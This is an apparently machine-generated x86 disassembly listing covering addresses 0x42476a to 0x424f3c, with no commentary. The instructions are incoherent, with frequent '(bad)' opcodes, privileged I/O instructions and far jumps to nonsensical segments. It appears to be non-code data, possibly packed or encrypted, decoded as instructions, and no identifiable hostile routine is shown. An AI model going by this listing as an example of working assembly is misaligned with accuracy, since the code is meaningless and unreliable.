  42476a:	mov    ?,WORD PTR [eax]
  42476c:	add    dh,BYTE PTR [edi+eiz*8]
  42476f:	and    eax,0xefc6d7b5
  424774:	adc    bl,bh
  424776:	loope  0x4247b2
  424778:	adc    dh,dl
  42477a:	inc    ebp
  42477b:	lods   al,BYTE PTR ds:[esi]
  42477c:	dec    esi
  42477d:	das    
  42477e:	call   0x5799:0xe41a7f62
  424785:	adc    BYTE PTR [esi+0x48],ch
  424788:	aas    
  424789:	mov    BYTE PTR [esi+0x4a],ah
  42478c:	sbb    esp,DWORD PTR [eax-0x5eb85fe3]
  424792:	pop    esp
  424793:	loop   0x4247c8
  424795:	fdivr  QWORD PTR [bx+si]
  424798:	in     al,dx
  424799:	push   ecx
  42479a:	retf   
  42479b:	sti    
  42479c:	mov    BYTE PTR [eax-0x10],dl
  42479f:	inc    esp
  4247a0:	loope  0x424798
  4247a2:	pusha  
  4247a3:	xchg   edi,eax
  4247a4:	(bad)  
  4247a5:	inc    ebp
  4247a7:	cmp    BYTE PTR [ebp+edi*8-0x18],0x37
  4247ac:	inc    edx
  4247ad:	xor    dh,dl
  4247af:	or     eax,0xc8806be9
  4247b4:	inc    edx
  4247b5:	repz jmp 0x93fb7154
  4247bb:	jg     0x424817
  4247bd:	in     al,dx
  4247be:	daa    
  4247bf:	mov    eax,DWORD PTR ds:0xda6a7613
  4247c5:	sub    cl,0x64
  4247c8:	xchg   esi,eax
  4247c9:	push   ss
  4247ca:	in     al,0x37
  4247cc:	mov    edx,0x7db991ec
  4247d1:	paddusb mm3,QWORD PTR [ecx-0x404c61f7]
  4247d8:	stos   DWORD PTR es:[edi],eax
  4247d9:	rcl    DWORD PTR [edi-0x70],cl
  4247dc:	arpl   WORD PTR [di],bx
  4247df:	enter  0x64ef,0x79
  4247e3:	dec    esp
  4247e4:	inc    ecx
  4247e5:	js     0x424800
  4247e7:	lahf   
  4247e8:	dec    edx
  4247e9:	push   0xffffff86
  4247eb:	mov    bh,0x7
  4247ed:	mov    ebp,0xf2f875cf
  4247f2:	pusha  
  4247f3:	pushf  
  4247f4:	leavew 
  4247f6:	or     al,dl
  4247f8:	jne    0x424812
  4247fa:	aam    0x69
  4247fc:	test   al,0x41
  4247fe:	add    DWORD PTR [ebx+edi*1],0x65
  424802:	gs xchg edx,eax
  424804:	pop    eax
  424805:	push   0x3bad57b1
  42480a:	xchg   BYTE PTR [eax+0x4bb5d426],dh
  424810:	(bad)
  424814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424815:	stos   BYTE PTR es:[edi],al
  424816:	mov    bl,0xad
  424818:	sub    al,0x3
  42481a:	or     BYTE PTR [ebx],ah
  42481c:	rcr    BYTE PTR [ecx],1
  42481e:	cs add dl,ch
  424821:	pushf  
  424822:	xchg   BYTE PTR [ebp+eiz*8-0x3cbad06a],cl
  424829:	push   edx
  42482a:	in     eax,dx
  42482b:	push   ss
  42482c:	ror    DWORD PTR [edx],cl
  42482e:	jmp    0xcaaa:0xac3e231a
  424835:	mov    esp,0x948fbcd2
  42483a:	mov    eax,0x3519c969
  42483f:	add    edi,0x5
  424842:	imul   esi,edi,0xffffff93
  424845:	xchg   ecx,eax
  424846:	xchg   ecx,eax
  424847:	push   esi
  424848:	mov    eax,ds:0x70f179a
  42484d:	shr    DWORD PTR [ebx],cl
  42484f:	es cmc 
  424851:	mov    fs,WORD PTR [ebp+0x4a0915b4]
  424857:	and    eax,DWORD PTR [esi-0x73e1340a]
  42485d:	leave  
  42485e:	adc    DWORD PTR [ecx+eiz*1],edi
  424861:	xor    al,0x9b
  424863:	xor    BYTE PTR [ecx-0x51c15183],ah
  424869:	fsubr  st(4),st
  42486b:	(bad)  
  42486c:	dec    eax
  42486d:	sub    al,BYTE PTR [edi+eiz*1+0x24]
  424871:	push   ss
  424872:	push   esp
  424873:	fisttp QWORD PTR [ecx+0x1aeb2a9]
  424879:	jle    0x42487f
  42487b:	push   cs
  42487c:	xor    eax,0x1fc987ce
  424881:	data16 cmp al,0x4e
  424884:	add    esp,DWORD PTR [ecx-0x46ecf4f0]
  42488a:	push   ebp
  42488b:	les    eax,FWORD PTR [ecx]
  42488d:	hlt    
  42488e:	sub    eax,0xd9dfa424
  424893:	cli    
  424894:	push   esi
  424895:	xlat   BYTE PTR ds:[ebx]
  424896:	dec    edi
  424897:	(bad)  
  424898:	xchg   ebx,eax
  424899:	xchg   ebp,eax
  42489a:	scas   eax,DWORD PTR es:[edi]
  42489b:	loop   0x424919
  42489d:	or     eax,0xb7c42916
  4248a2:	or     DWORD PTR [eax+0x1eacbf17],0x11
  4248a9:	dec    esp
  4248aa:	bound  eax,QWORD PTR ds:[esi]
  4248ad:	push   edx
  4248ae:	or     bl,ch
  4248b0:	shl    DWORD PTR ds:0xcc0b8a9d,1
  4248b6:	mov    al,0x8a
  4248b8:	cmp    eax,0x2e3c57f2
  4248bd:	jle    0x424843
  4248bf:	lea    ecx,[esi+ebp*8+0x3dcbb4c9]
  4248c6:	repnz pop es
  4248c8:	iret   
  4248c9:	sar    dh,cl
  4248cb:	sbb    BYTE PTR [esp+ebx*4+0x4c],cl
  4248cf:	mov    cl,0x45
  4248d1:	jp     0x4248b3
  4248d3:	lods   al,BYTE PTR ds:[esi]
  4248d4:	fwait
  4248d5:	ss cmp ah,dh
  4248d8:	mov    ds:0x706d599c,eax
  4248dd:	lock xchg BYTE PTR [eax+ebp*4-0x208bb2e8],dl
  4248e5:	fisttp QWORD PTR [ebx+eax*4+0x6d482e1c]
  4248ec:	pop    ecx
  4248ed:	push   ds
  4248ee:	jge    0x424950
  4248f0:	inc    esp
  4248f1:	sub    al,0x40
  4248f3:	ret    
  4248f4:	sahf   
  4248f5:	jno    0x424959
  4248f7:	cli    
  4248f8:	loopne 0x424971
  4248fa:	aas    
  4248fb:	stos   DWORD PTR es:[edi],eax
  4248fc:	and    eax,0x1b2214ba
  424901:	mov    bl,0xaa
  424903:	jnp    0x424927
  424905:	mov    bl,0x68
  424907:	leave  
  424908:	js     0x4248f5
  42490a:	push   edi
  42490b:	daa    
  42490c:	fnstsw WORD PTR [eax]
  42490e:	ds push ebx
  424910:	(bad)  
  424911:	aam    0xd5
  424913:	popa   
  424914:	pop    ss
  424915:	inc    esi
  424916:	push   esi
  424917:	push   DWORD PTR [edi-0x43]
  42491a:	dec    ebx
  42491b:	inc    eax
  42491c:	sbb    BYTE PTR [ebx],bl
  42491e:	xor    bh,ch
  424920:	pop    es
  424921:	dec    edx
  424922:	xor    cl,BYTE PTR [eax-0x6440b635]
  424928:	enter  0x7cca,0x1e
  42492c:	out    dx,al
  42492d:	aas    
  42492e:	imul   esp,DWORD PTR ds:0xa4505d89,0xfffffff2
  424935:	cmp    eax,0x353e8ef7
  42493a:	popf   
  42493b:	or     cl,BYTE PTR es:[edi+ebp*2]
  42493f:	les    esp,FWORD PTR [ebp+0x77c01a0a]
  424945:	lods   eax,DWORD PTR ds:[esi]
  424946:	retf   0x1c02
  424949:	push   ss
  42494a:	fwait
  42494b:	push   edx
  42494c:	and    DWORD PTR [ebp-0x43],edi
  42494f:	cwde   
  424950:	xchg   DWORD PTR [ecx+0x61f7c677],esp
  424956:	mov    ecx,0xc587921d
  42495b:	jno    0x42494c
  42495d:	enter  0x9bba,0x58
  424961:	push   ss
  424962:	(bad)  
  424963:	sub    eax,0x9425b24e
  424968:	jns    0x424953
  42496a:	or     ch,BYTE PTR [edx-0x5008c135]
  424970:	xchg   ecx,eax
  424971:	add    eax,0x95a18349
  424976:	pop    edi
  424977:	loope  0x4249b9
  424979:	repnz inc ebx
  42497b:	repz push esp
  42497d:	push   edi
  42497e:	mov    al,ds:0x5e045647
  424983:	cmc    
  424984:	popa   
  424985:	lods   al,BYTE PTR ds:[esi]
  424986:	jno    0x424993
  424988:	mov    eax,0x56ec30bf
  42498d:	iret   
  42498e:	push   es
  42498f:	cdq    
  424990:	clc    
  424991:	repz jmp 0x4249d2
  424994:	test   BYTE PTR [eax],0xd2
  424997:	push   0x4c62b71e
  42499c:	jmp    0x50ccd998
  4249a1:	hlt    
  4249a2:	popf   
  4249a3:	mov    ecx,0x7ef33760
  4249a8:	add    al,0x22
  4249aa:	xlat   BYTE PTR ds:[ebx]
  4249ab:	in     al,0x23
  4249ad:	shl    DWORD PTR [edx-0x461f4fdf],0xb6
  4249b4:	out    dx,al
  4249b5:	pop    ebx
  4249b6:	shl    BYTE PTR [edx],0x12
  4249b9:	add    esi,ecx
  4249bb:	popf   
  4249bc:	pop    ecx
  4249bd:	icebp  
  4249be:	xor    DWORD PTR [ebx],edx
  4249c0:	nop
  4249c1:	in     al,dx
  4249c2:	or     ch,bh
  4249c4:	inc    edx
  4249c5:	pop    ebp
  4249c6:	lock adc ecx,DWORD PTR [edx-0x2b]
  4249ca:	jmp    0xc1f0:0xe0850e54
  4249d1:	push   ebx
  4249d2:	jmp    esp
  4249d4:	mov    bl,0x1a
  4249d6:	enter  0x823f,0x11
  4249da:	sar    ebp,1
  4249dc:	in     al,0xa1
  4249de:	cmp    BYTE PTR [esi+0x1],0xb7
  4249e2:	pop    es
  4249e3:	call   0x39842d6
  4249e8:	leave  
  4249e9:	cmp    eax,0xeb01310e
  4249ee:	mov    cl,0xfb
  4249f0:	int3   
  4249f1:	call   0xa853bc35
  4249f6:	out    dx,eax
	...
  4249ff:	add    BYTE PTR [eax],al
  424a01:	push   ebp
  424a02:	push   0xffffffe6
  424a04:	mov    bl,0xff
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	sahf   
  424a0e:	jge    0x424a7f
  424a10:	fs sti 
  424a12:	rol    DWORD PTR [ecx],0x0
  424a15:	scas   al,BYTE PTR es:[edi]
  424a16:	add    eax,DWORD PTR [eax]
  424a18:	add    dh,bh
  424a1a:	push   edx
  424a1b:	mov    esi,0x48dd40a2
  424a20:	call   0x3c1ac3b5
  424a25:	test   BYTE PTR [ecx-0x47],al
  424a28:	mov    DWORD PTR [ebx-0x4cf72027],ebx
  424a2e:	outs   dx,BYTE PTR ds:[si]
  424a30:	mov    al,ds:0x4b7e1e69
  424a35:	sar    DWORD PTR [edi],cl
  424a37:	popa   
  424a38:	pop    esp
  424a39:	inc    edx
  424a3a:	sub    ch,BYTE PTR [ebp+0x31]
  424a3d:	inc    ecx
  424a3e:	cmp    eax,0x325d36bc
  424a43:	sub    BYTE PTR [eax],dl
  424a45:	xchg   esi,eax
  424a46:	push   0x69
  424a48:	ret    
  424a49:	mov    al,ds:0x4c9f03cd
  424a4e:	mov    ebx,0x8a7368d0
  424a53:	mov    bl,0x8b
  424a55:	push   0xffffffd5
  424a57:	xchg   edi,eax
  424a58:	jnp    0x424a89
  424a5a:	push   ecx
  424a5b:	add    al,0xae
  424a5d:	inc    edx
  424a5e:	pop    ds
  424a5f:	ret    
  424a60:	data16 (bad) 
  424a62:	hlt    
  424a63:	repz xchg esi,eax
  424a65:	out    dx,eax
  424a66:	scas   al,BYTE PTR es:[edi]
  424a67:	iret   
  424a68:	mov    al,fs:0x4f08d198
  424a6e:	mov    al,0x3e
  424a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a71:	add    al,0x35
  424a73:	sub    eax,0xe563f6dd
  424a78:	push   ebx
  424a79:	mov    ebp,0x65432d0e
  424a7e:	fld    st(7)
  424a80:	sub    esi,DWORD PTR [esi*8-0x5e18dfe7]
  424a87:	jb     0x424a2a
  424a89:	cmp    al,dh
  424a8b:	pop    ebx
  424a8c:	push   ebx
  424a8d:	sar    BYTE PTR [ebp-0x14],cl
  424a90:	(bad)  
  424a92:	xchg   esp,eax
  424a93:	(bad)  
  424a94:	(bad)  
  424a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a96:	dec    esi
  424a97:	and    al,0x3e
  424a99:	out    dx,al
  424a9a:	rcr    DWORD PTR [edx-0x37d52605],cl
  424aa0:	ret    
  424aa1:	adc    eax,0x31439ce
  424aa6:	jns    0x424a81
  424aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424aa9:	ret    
  424aaa:	in     al,dx
  424aab:	ret    0xc230
  424aae:	ins    BYTE PTR es:[edi],dx
  424aaf:	dec    ecx
  424ab0:	pop    ss
  424ab1:	test   eax,0x76a9ff80
  424ab6:	jle    0x424ab4
  424ab8:	cmp    eax,DWORD PTR [edi]
  424aba:	imul   BYTE PTR [ecx+0x45]
  424abd:	mov    bh,0x2
  424abf:	mov    edi,0x3a20910c
  424ac4:	and    al,0xdb
  424ac6:	mov    ch,0xd5
  424ac8:	sbb    ah,BYTE PTR [ebp-0x64b5ef1a]
  424ace:	in     eax,0xaa
  424ad0:	adc    DWORD PTR [ebp+edi*2+0x73a0ee08],esi
  424ad7:	adc    al,0xf0
  424ad9:	ret    
  424ada:	adc    DWORD PTR [edx-0x7f],0x48803b0e
  424ae1:	cmp    eax,0xf68c786c
  424ae6:	jae    0x424b51
  424ae8:	inc    edi
  424ae9:	pusha  
  424aea:	lods   al,BYTE PTR ds:[esi]
  424aeb:	pop    ebp
  424aec:	push   esi
  424aed:	mov    al,dl
  424aef:	out    dx,al
  424af0:	fwait
  424af1:	jno    0x424a79
  424af3:	cld    
  424af4:	bound  edi,QWORD PTR [eax+0x5b1d5549]
  424afa:	xchg   ebp,eax
  424afb:	mov    ecx,0xd9aa419d
  424b00:	out    dx,al
  424b01:	and    eax,0x5af32fe9
  424b06:	(bad)  
  424b07:	ins    BYTE PTR es:[edi],dx
  424b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b09:	add    dl,BYTE PTR [ebx+ecx*2]
  424b0c:	jmp    0xaea41dce
  424b11:	in     eax,dx
  424b12:	js     0x424ab0
  424b14:	fisttp DWORD PTR [edi+0x47f81452]
  424b1a:	push   esi
  424b1b:	pop    ebp
  424b1c:	mov    ds:0x656701c0,al
  424b21:	pop    ecx
  424b22:	in     al,dx
  424b23:	adc    ecx,ebx
  424b25:	daa    
  424b26:	daa    
  424b27:	or     eax,0x1d8e1bb
  424b2c:	push   ebp
  424b2d:	adc    DWORD PTR [edx+ebp*2+0x3f5fb7e],edi
  424b34:	in     al,0xdf
  424b36:	fst    DWORD PTR [ebp-0x15addfa3]
  424b3c:	jle    0x424bb0
  424b3e:	lds    esp,FWORD PTR [eax]
  424b40:	and    ebx,DWORD PTR [ecx]
  424b42:	out    dx,eax
  424b43:	sbb    BYTE PTR [eax],0x6c
  424b46:	ds call 0x48a1:0x4386e60d
  424b4e:	std    
  424b4f:	aam    0xc
  424b51:	es mov dl,0x9a
  424b54:	jae    0x424b32
  424b56:	mov    eax,0x60db8b97
  424b5b:	iret   
  424b5c:	jmp    0x424bd7
  424b5e:	pusha  
  424b5f:	retf   0x120a
  424b62:	or     BYTE PTR [esi+0x6eab92dc],dh
  424b68:	jge    0x424bc5
  424b6a:	pop    eax
  424b6b:	loope  0x424b90
  424b6d:	in     eax,0x92
  424b6f:	mov    edx,0xe6a78e84
  424b74:	rcr    BYTE PTR [edx+0xf793236],1
  424b7a:	pop    ecx
  424b7b:	push   ebp
  424b7c:	inc    edi
  424b7d:	fcomp  st(7)
  424b7f:	xor    eax,0x78c0ae60
  424b84:	jno    0x424b46
  424b86:	stos   DWORD PTR es:[edi],eax
  424b87:	mov    cl,0x4a
  424b89:	sub    al,0x87
  424b8b:	ret    0x1597
  424b8e:	shr    ebp,1
  424b90:	fs (bad) 
  424b92:	js     0x424b6a
  424b94:	imul   ecx,DWORD PTR [ecx+0x25],0x7a
  424b98:	push   ds
  424b99:	mov    ebp,esi
  424b9b:	sbb    dl,BYTE PTR [esi]
  424b9d:	push   ebx
  424b9e:	aam    0x17
  424ba0:	lods   al,BYTE PTR ds:[esi]
  424ba1:	neg    DWORD PTR ds:0xbff67f85
  424ba7:	sbb    eax,0x65c0f69e
  424bac:	call   0xbbbc:0x11fbae88
  424bb3:	jp     0x424b67
  424bb5:	push   ebp
  424bb6:	lods   al,BYTE PTR ds:[esi]
  424bb7:	jle    0x424c25
  424bb9:	cmp    eax,DWORD PTR [eax-0x44c1e44b]
  424bbf:	or     dh,BYTE PTR ds:0x91cf4943
  424bc5:	dec    esi
  424bc6:	push   ss
  424bc7:	ds cmp al,0x73
  424bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bcb:	push   0x3df7ba93
  424bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bd1:	push   0x27
  424bd3:	icebp  
  424bd4:	dec    edi
  424bd5:	sahf   
  424bd6:	adc    ecx,eax
  424bd8:	sbb    BYTE PTR [ecx+0x79eb44bb],bl
  424bde:	cmp    al,0xdb
  424be0:	fs jge 0x424c53
  424be3:	pushf  
  424be4:	adc    DWORD PTR ds:0x460ad0c1,ecx
  424bea:	mov    BYTE PTR [esi+edi*8],ch
  424bed:	repnz inc edi
  424bef:	jg     0x424c33
  424bf1:	bound  ebp,QWORD PTR [ecx-0x5684f851]
  424bf7:	pop    ds
  424bf8:	outs   dx,BYTE PTR ds:[esi]
  424bf9:	mov    ah,0xd5
  424bfb:	pop    edi
  424bfc:	ins    DWORD PTR es:[edi],dx
  424bfd:	(bad)  
  424bfe:	cli    
  424bff:	xchg   BYTE PTR [eax],ah
  424c01:	add    al,0x22
  424c03:	repz jge 0x424c5a
  424c06:	repnz sub eax,0xd762f464
  424c0c:	adc    dl,BYTE PTR [ecx+0x59]
  424c0f:	scas   al,BYTE PTR es:[edi]
  424c10:	(bad)  
  424c11:	mov    WORD PTR [edx+0x4482dd3d],ss
  424c17:	retf   0xd79c
  424c1a:	sar    DWORD PTR [ebx+ecx*1-0x5938e544],cl
  424c21:	outs   dx,BYTE PTR ds:[esi]
  424c22:	mov    esp,0xfd22bb36
  424c27:	mov    ebx,0x51f85c18
  424c2c:	inc    esi
  424c2d:	push   ds
  424c2e:	rol    BYTE PTR gs:[bp+di+0x2df1],0xca
  424c35:	mov    ecx,esi
  424c37:	ret    0x9f7b
  424c3a:	cmp    eax,0x16d3e80b
  424c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c40:	stos   DWORD PTR es:[edi],eax
  424c41:	bound  edi,QWORD PTR [eax-0x42]
  424c44:	dec    eax
  424c45:	sub    DWORD PTR [ebp+0x7],ebx
  424c48:	addr16 mov esp,0xdee57881
  424c4e:	test   DWORD PTR [esi-0x4c],ecx
  424c51:	xor    al,0x54
  424c53:	add    al,0x7d
  424c55:	les    esp,FWORD PTR [ecx+0x72]
  424c58:	imul   ebp,esi,0xa97844b5
  424c5e:	cmp    eax,DWORD PTR [eax-0x55]
  424c61:	daa    
  424c62:	dec    esi
  424c63:	add    dl,dl
  424c65:	push   0x48dab3a4
  424c6a:	add    DWORD PTR [ebp-0x7f],edx
  424c6d:	jnp    0x424cd4
  424c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c70:	ss sub al,0x46
  424c73:	int3   
  424c74:	mov    dl,0x86
  424c76:	xor    BYTE PTR [ebp-0x61],dh
  424c79:	jg     0x424c9b
  424c7b:	imul   BYTE PTR [esi*2-0x4de4c711]
  424c82:	fdivr  st,st(4)
  424c84:	jo     0x424cee
  424c86:	(bad)  
  424c87:	scas   al,BYTE PTR es:[edi]
  424c88:	sti    
  424c89:	mov    ds:0xadf84931,al
  424c8e:	jo     0x424cdd
  424c90:	pop    ss
  424c91:	dec    eax
  424c92:	test   eax,0xc06e2593
  424c97:	aas    
  424c98:	hlt    
  424c99:	mov    bh,0xf7
  424c9b:	(bad)  
  424c9c:	scas   al,BYTE PTR es:[edi]
  424c9d:	das    
  424c9e:	lock push ecx
  424ca0:	cmp    BYTE PTR [edx+eiz*4],bh
  424ca3:	push   0x6701e6b3
  424ca8:	mov    dh,0x21
  424caa:	outs   dx,DWORD PTR ds:[esi]
  424cab:	lea    eax,[edi+0x405fcce9]
  424cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cb2:	push   edi
  424cb3:	jl     0x424d1a
  424cb5:	shl    DWORD PTR [ecx+0x8674222],cl
  424cbb:	scas   al,BYTE PTR es:[edi]
  424cbc:	push   ebp
  424cbd:	lea    ecx,[edx+0x1c510c8]
  424cc3:	push   0x3f
  424cc5:	mov    esi,0x85c67b22
  424cca:	popa   
  424ccb:	sti    
  424ccc:	out    0x1f,eax
  424cce:	into   
  424ccf:	mov    edx,0xb95cd794
  424cd4:	jg     0x424c7f
  424cd6:	jge    0x424cb1
  424cd8:	cld    
  424cd9:	mov    edi,DWORD PTR [ecx+eiz*2]
  424cdc:	dec    ebp
  424cdd:	sbb    ah,dh
  424cdf:	test   BYTE PTR [edi-0x56f17eeb],dh
  424ce5:	(bad)  
  424ce6:	popa   
  424ce7:	dec    ecx
  424ce8:	ret    0x16ad
  424ceb:	(bad)  
  424cec:	(bad)  
  424ced:	stos   BYTE PTR es:[edi],al
  424cee:	lds    eax,FWORD PTR [ecx]
  424cf0:	mov    al,ds:0x3bcc45d6
  424cf5:	jno    0x424c83
  424cf7:	dec    ecx
  424cf8:	out    0x39,al
  424cfa:	imul   ah
  424cfc:	ret    
  424cfd:	pop    edi
  424cfe:	mov    edi,DWORD PTR [esi-0x76]
  424d01:	sbb    ebx,edi
  424d03:	sbb    al,0x5b
  424d05:	sub    BYTE PTR [ebx+0x5c],ah
  424d08:	enter  0x7f25,0xb
  424d0c:	js     0x424cfd
  424d0e:	dec    esp
  424d0f:	mov    cl,0x8f
  424d11:	jbe    0x424d24
  424d13:	xchg   ebp,eax
  424d14:	pushf  
  424d15:	xor    BYTE PTR [ebx-0x17dce50f],dh
  424d1b:	cmp    al,0x43
  424d1d:	scas   eax,DWORD PTR es:[edi]
  424d1e:	std    
  424d1f:	mov    al,0xd3
  424d21:	in     al,dx
  424d22:	mov    al,0x8a
  424d24:	mov    cl,BYTE PTR [ebx]
  424d26:	lods   al,BYTE PTR cs:[esi]
  424d28:	fwait
  424d29:	push   ds
  424d2a:	loope  0x424cc0
  424d2c:	fistp  WORD PTR [ebp+0x5047a573]
  424d32:	ds repz jnp 0x424d1f
  424d36:	adc    BYTE PTR [ebp+0x4a426ba4],0x89
  424d3d:	es test edi,ebx
  424d40:	mov    ss,WORD PTR [ebp+0x5816778]
  424d46:	cli    
  424d47:	cmp    esp,0x5a
  424d4a:	adc    bh,BYTE PTR [edi+edx*8-0x72]
  424d4e:	ins    BYTE PTR es:[edi],dx
  424d4f:	retf   
  424d50:	mov    bh,0x22
  424d52:	enter  0xcb78,0x6
  424d56:	add    dl,BYTE PTR [eax+edx*8+0x52]
  424d5a:	push   cs
  424d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d5c:	retf   0x7f31
  424d5f:	jge    0x424d8f
  424d61:	ret    
  424d62:	mov    al,ds:0x73d0903c
  424d67:	inc    ebx
  424d68:	add    al,0xbd
  424d6a:	mov    ds,edx
  424d6c:	pop    es
  424d6d:	pop    ecx
  424d6e:	out    dx,eax
  424d6f:	and    BYTE PTR [edi],bl
  424d71:	shl    BYTE PTR [edx],1
  424d73:	pop    ebp
  424d74:	(bad)  
  424d75:	push   ebp
  424d76:	ret    0x29
  424d79:	stos   DWORD PTR es:[edi],eax
  424d7a:	inc    eax
  424d7b:	mov    ?,WORD PTR [ebp-0x2e5119f7]
  424d81:	xchg   esp,eax
  424d82:	xchg   edi,eax
  424d83:	jmp    0xa0ae:0xb293d506
  424d8a:	xchg   ebp,eax
  424d8b:	mov    dl,BYTE PTR [edi]
  424d8d:	in     eax,dx
  424d8e:	sub    al,bl
  424d90:	js     0x424df2
  424d92:	jmp    0xdb8e:0xab77bfb1
  424d99:	ror    bl,0xa6
  424d9c:	data16 jne 0x424dff
  424d9f:	nop
  424da0:	pop    edx
  424da1:	ret    0x6ef0
  424da4:	and    BYTE PTR es:[edi+0x428190b2],al
  424dab:	mov    eax,ds:0xa13867ab
  424db0:	and    eax,0xe1a03c5
  424db5:	mov    bl,0x57
  424db7:	jae    0x424d58
  424db9:	cli    
  424dba:	jp     0x424d55
  424dbc:	inc    ebp
  424dbd:	dec    ebp
  424dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dbf:	rol    BYTE PTR [edx-0x5c],0x81
  424dc3:	jns    0x424d7b
  424dc5:	pop    esp
  424dc6:	lds    eax,FWORD PTR [eax]
	...
  424dd0:	add    BYTE PTR [esi-0x42494e3],cl
  424dd6:	(bad)  
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    bh,BYTE PTR [ebx-0x42]
  424ddf:	pop    ebp
  424de0:	inc    edi
  424de1:	test   eax,0xae0001c5
  424de6:	add    eax,DWORD PTR [eax]
  424de8:	add    BYTE PTR [esi],cl
  424dea:	xchg   DWORD PTR [ebx-0x3ff56cd4],ebx
  424df0:	addr16 pop ecx
  424df2:	and    eax,0x347ed5a4
  424df7:	nop
  424df8:	cmp    esp,DWORD PTR [edx]
  424dfa:	call   0x182634c7
  424dff:	jnp    0x424d87
  424e01:	ins    BYTE PTR es:[edi],dx
  424e02:	ds xchg edi,eax
  424e04:	loope  0x424ded
  424e06:	test   DWORD PTR [edi],eax
  424e08:	mov    ebp,0x757c0052
  424e0d:	lds    edx,FWORD PTR [ecx]
  424e0f:	push   esi
  424e10:	or     ebx,DWORD PTR [eax+eiz*1]
  424e13:	ror    BYTE PTR [ebx-0x64],cl
  424e16:	xchg   edx,eax
  424e17:	add    al,0x2a
  424e19:	sub    eax,0x4349a527
  424e1e:	call   0xf228:0x3e400308
  424e25:	inc    ebx
  424e26:	clc    
  424e27:	loop   0x424e5e
  424e29:	pop    esp
  424e2a:	push   cs
  424e2b:	(bad)  
  424e2d:	cmp    DWORD PTR [esi-0x3],0xd93d0c5
  424e34:	mov    ds:0xba821889,al
  424e39:	push   esi
  424e3a:	mov    ebx,0xdef8b1d2
  424e3f:	outs   dx,BYTE PTR ds:[esi]
  424e40:	adc    eax,0xe92aef33
  424e45:	neg    DWORD PTR [esi]
  424e47:	and    BYTE PTR [ebp-0x3c],dh
  424e4a:	(bad)  
  424e4b:	jp     0x424e90
  424e4d:	push   eax
  424e4e:	shr    DWORD PTR [esi+0x78488ae1],1
  424e54:	jmp    0x424e80
  424e56:	pop    es
  424e57:	int    0xfc
  424e59:	inc    eax
  424e5a:	and    esi,DWORD PTR [edx+0x25]
  424e5d:	and    al,dl
  424e5f:	mov    bl,0x41
  424e61:	dec    edi
  424e62:	xor    DWORD PTR [eax+0x2816baf],ebx
  424e68:	add    eax,0x318d68d1
  424e6d:	and    bh,BYTE PTR [ebx+0x73e72b7e]
  424e73:	int3   
  424e74:	adc    eax,0x5ca5eab3
  424e79:	mov    ecx,0x211d18fa
  424e7e:	shr    edi,cl
  424e80:	dec    edi
  424e81:	adc    bl,bh
  424e83:	xchg   ebx,eax
  424e84:	pop    eax
  424e85:	pushf  
  424e86:	loopne 0x424ed4
  424e88:	xor    DWORD PTR [edx+0x43287ece],0xed92bc0f
  424e92:	inc    edx
  424e93:	xchg   esp,eax
  424e94:	xchg   esi,eax
  424e95:	fwait
  424e96:	(bad)  
  424e97:	jae    0x424ee7
  424e99:	sub    DWORD PTR [eax],0xfafd2b
  424e9f:	pop    ss
  424ea0:	icebp  
  424ea1:	stos   BYTE PTR es:[edi],al
  424ea2:	lahf   
  424ea3:	jecxz  0x424ecc
  424ea5:	les    esi,FWORD PTR [edx]
  424ea7:	dec    ecx
  424ea8:	add    al,0x95
  424eaa:	sub    edx,DWORD PTR [edx]
  424eac:	ins    BYTE PTR es:[edi],dx
  424ead:	idiv   DWORD PTR [edx-0x78]
  424eb0:	add    eax,0x85f6bae7
  424eb5:	dec    edi
  424eb6:	outs   dx,DWORD PTR ds:[esi]
  424eb7:	addr16 mov ch,bl
  424eba:	out    dx,eax
  424ebb:	sbb    eax,0xed2a69af
  424ec0:	loopne 0x424ef4
  424ec2:	adc    esi,edx
  424ec4:	mov    eax,DWORD PTR [ecx]
  424ec6:	push   ecx
  424ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ec8:	retf   
  424ec9:	fucomi st,st(2)
  424ecb:	rcl    DWORD PTR [edx-0x21162f61],1
  424ed1:	jl     0x424f20
  424ed3:	rol    DWORD PTR [ecx*2-0x1480cc88],1
  424eda:	xchg   ebp,eax
  424edb:	cld    
  424edc:	out    dx,al
  424edd:	pop    edx
  424ede:	hlt    
  424edf:	test   eax,0xeb56d0a5
  424ee4:	mov    gs,WORD PTR [ecx+eiz*2]
  424ee7:	pushf  
  424ee8:	out    0x83,al
  424eea:	adc    al,0xec
  424eec:	cmc    
  424eed:	idiv   ch
  424eef:	mov    esi,0x728e6056
  424ef4:	mov    ds:0x7b5c67bb,al
  424ef9:	into   
  424efa:	xor    ecx,DWORD PTR ds:0x9b4eaee3
  424f00:	(bad)  
  424f01:	fld    QWORD PTR [ebx-0x4e]
  424f04:	xchg   edx,eax
  424f05:	test   esi,ebx
  424f07:	sbb    BYTE PTR [edi-0x65],0x16
  424f0b:	jb     0x424ed8
  424f0d:	retf   0xce0b
  424f10:	test   DWORD PTR [ebx+0x2ad015d2],ecx
  424f16:	ror    DWORD PTR [ebx-0x55788cee],0xfb
  424f1d:	fnstsw WORD PTR [esi]
  424f1f:	inc    esp
  424f20:	test   al,0x6e
  424f22:	cmp    ah,BYTE PTR [eax*2-0x557db82f]
  424f29:	rcl    esp,1
  424f2b:	sahf   
  424f2c:	and    edx,DWORD PTR [eax-0x61]
  424f2f:	scas   eax,DWORD PTR es:[edi]
  424f30:	mov    dh,0x61
  424f32:	or     BYTE PTR [ebx+eax*8-0x6d7102f9],dh
  424f39:	inc    esp
  424f3a:	adc    ch,al
  424f3c:	retf   
